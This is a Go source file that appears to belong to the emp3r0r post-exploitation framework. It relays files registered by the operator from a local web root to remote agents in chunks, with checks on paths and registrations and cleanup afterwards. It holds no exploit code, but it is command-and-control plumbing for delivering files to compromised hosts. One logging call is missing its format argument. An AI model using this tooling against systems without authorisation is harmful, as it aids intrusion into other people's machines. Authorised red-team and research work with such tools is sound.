package operator

import (
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/paths"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func handleWWWRelayMessage(data *def.OperatorMsg) bool {
	if data == nil {
		return false
	}
	if !strings.HasPrefix(data.Tag, def.TagWWWRelayRequestPrefix) {
		return false
	}

	streamID := strings.TrimPrefix(data.Tag, def.TagWWWRelayRequestPrefix)
	go serveWWWRelay(streamID)
	return true
}

// serveWWWRelay answers an agent's www-route request from this operator's WWW
// root. The agent only sees an empty stream when this fails, so every failure is
// logged here with the path that was tried: this log is the only place that says
// why a fetch produced no data.
func serveWWWRelay(streamID string) {
	localized, err := util.SecureLocalPath(streamID)
	if err != nil {
		logging.Errorf("WWW relay: refusing %q: %v", streamID, err)
		_ = client.SendOperatorMsg(&def.OperatorMsg{Tag: def.TagWWWRelayErrorPrefix + streamID, Response: []byte(err.Error())})
		return
	}
	name := filepath.Base(localized)

	// Only files this operator registered for an agent are served; the
	// registration is one-shot and dropped when the transfer ends.
	val, found := network.WWWDownloads.Load("name:" + name)
	if !found {
		logging.Errorf("WWW relay: refusing %q: no operator-registered download for this agent")
		_ = client.SendOperatorMsg(&def.OperatorMsg{Tag: def.TagWWWRelayErrorPrefix + streamID, Response: []byte("unregistered download")})
		return
	}
	dl, ok := val.(*network.WWWDownload)
	if !ok || dl == nil {
		network.WWWDownloads.Delete("name:" + name)
		_ = client.SendOperatorMsg(&def.OperatorMsg{Tag: def.TagWWWRelayErrorPrefix + streamID, Response: []byte("invalid download registration")})
		return
	}
	defer func() {
		network.WWWDownloads.Delete("name:" + name)
		if err := client.UnregisterWWWDownload(name, ""); err != nil {
			logging.Debugf("WWW relay: unregister %q: %v", name, err)
		}
		// A copy made for this transfer is finished either way: keeping it
		// would leave a random-name file in the www root per transfer.
		if dl.Transient {
			if err := os.Remove(filepath.Join(paths.WWWRoot, dl.Name)); err != nil {
				logging.Debugf("WWW relay: remove transient copy %q: %v", dl.Name, err)
			}
		}
	}()

	path := filepath.Join(paths.WWWRoot, name)

	f, err := os.Open(path)
	if err != nil {
		logging.Errorf("WWW relay: cannot serve %q: %v (hosted files live in %s)", streamID, err, paths.WWWRoot)
		_ = client.SendOperatorMsg(&def.OperatorMsg{Tag: def.TagWWWRelayErrorPrefix + streamID, Response: []byte(err.Error())})
		return
	}
	defer f.Close()

	if fi, statErr := f.Stat(); statErr == nil {
		logging.Infof("WWW relay: serving %s (%s) to the agent", path, util.FormatBytes(fi.Size()))
	}

	buf := make([]byte, 64*1024)
	for {
		n, readErr := f.Read(buf)
		if n > 0 {
			chunk := make([]byte, n)
			copy(chunk, buf[:n])
			if err := client.SendOperatorMsg(&def.OperatorMsg{Tag: def.TagWWWRelayDataPrefix + streamID, Response: chunk}); err != nil {
				logging.Errorf("WWW relay send failed for %q: %v", streamID, err)
				return
			}
		}
		if readErr != nil {
			if readErr == io.EOF {
				_ = client.SendOperatorMsg(&def.OperatorMsg{Tag: def.TagWWWRelayDonePrefix + streamID})
			} else {
				logging.Errorf("WWW relay: reading %s failed: %v", path, readErr)
				_ = client.SendOperatorMsg(&def.OperatorMsg{Tag: def.TagWWWRelayErrorPrefix + streamID, Response: []byte(readErr.Error())})
			}
			return
		}
	}
}
